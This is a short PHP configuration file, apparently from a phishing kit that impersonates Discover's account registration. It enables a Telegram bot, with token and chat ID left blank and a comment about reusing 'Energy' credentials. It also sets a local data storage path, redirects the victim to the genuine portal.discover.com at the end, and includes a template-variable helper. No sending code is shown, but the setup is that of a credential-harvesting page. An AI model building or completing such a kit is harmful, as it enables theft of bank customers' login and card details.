<?php
/**
 * Configuration for Discover PHP Application
 */

// Telegram Bot Configuration (reuse Energy credentials or set disabled)
define('TELEGRAM_ENABLED', true);
define('TELEGRAM_BOT_TOKEN', ''); // TODO: Add token or leave blank
define('TELEGRAM_CHAT_ID', ''); // TODO: Add chat id

// Data storage path
define('DATA_STORAGE_PATH', __DIR__ . '/data');

// App settings
define('APP_NAME', 'Discover Account Registration');
define('APP_VERSION', '1.0.0');

define('DEBUG_MODE', false);

define('FINAL_REDIRECT_URL', 'https://portal.discover.com/');

function getFormattedTimestamp() {
    return date('Y-m-d H:i:s');
}

function replaceTemplateVars($template, $vars) {
    foreach ($vars as $k => $v) {
        $template = str_replace('{' . $k . '}', $v, $template);
    }
    return $template;
}
